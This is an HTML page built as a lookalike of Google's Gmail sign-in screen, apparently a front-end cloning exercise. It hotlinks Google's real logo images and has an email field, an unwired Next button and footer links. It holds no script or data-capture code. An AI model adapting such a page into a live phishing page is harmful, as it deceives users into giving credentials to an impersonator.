<!DOCTYPE html>
<html>
	<head>
			<title>Google login</title>
			<meta name="viewport" content="width=device-width, initial-scale=1">
			<link rel="stylesheet" href="goog.css" >
			<link href="https://fonts.googleapis.com/css?family=Open+Sans:300" rel="stylesheet">
			<link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
	</head>

	<body>
			<div class="container">
				<header>
						<div class="logo">
								<center><img src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png"></center>
						</div>
				</header>
				<div class="main">
						<div class="banner">
								<h1>One account. All of Google.</h1>
								<h2>Sign in to continue to Gmail</h2>
								<center>
									<div class="w3-card-2">
										<p>
											<img class="icon" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
										</p>
										<div class="data">
											<center>
												<div id="Emailbox">
														<input id="email" type="email" name="mail" placeholder="Enter your email"><br>
												</div>
											</center>
											<center>
												<div id="Nextbox">
  														<input id="next" type="button" name="next" value="Next"><br>
  														
  												</div>
  											</center>
  											<a id="help" href="#">Need help?</a>
  										</div>
									</div>
								</center>
						</div>
						<center>
							<div class="Createacc">
									<center>
											<a href="#">Create account</a>
											<p id="foot">One Google Account for everything Google</p>
									</center>
									<div class="iconslist">

										<img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png">
									</div>
							</div>
						</center>		
				</div>
				<footer>
					<div class="footerclass">
						<ul id="terms">
							<li><a  href="#">About Google</a></li>
							<li><a href="#">Privacy</a></li>
							<li><a href="#">Terms</a></li>
							<li><a href="#">Help</a></li>
						</ul>
					</div>
						
						<select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  								<option value="a">English(United States)
  								</option>
  								<option value="b">Hindi
  								</option>
  								<option value="c">Malayalam
  								</option>

  						</select>

  						<img id="img" src="https://ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png">
  
				</footer>
			</div>

	</body>
</html>
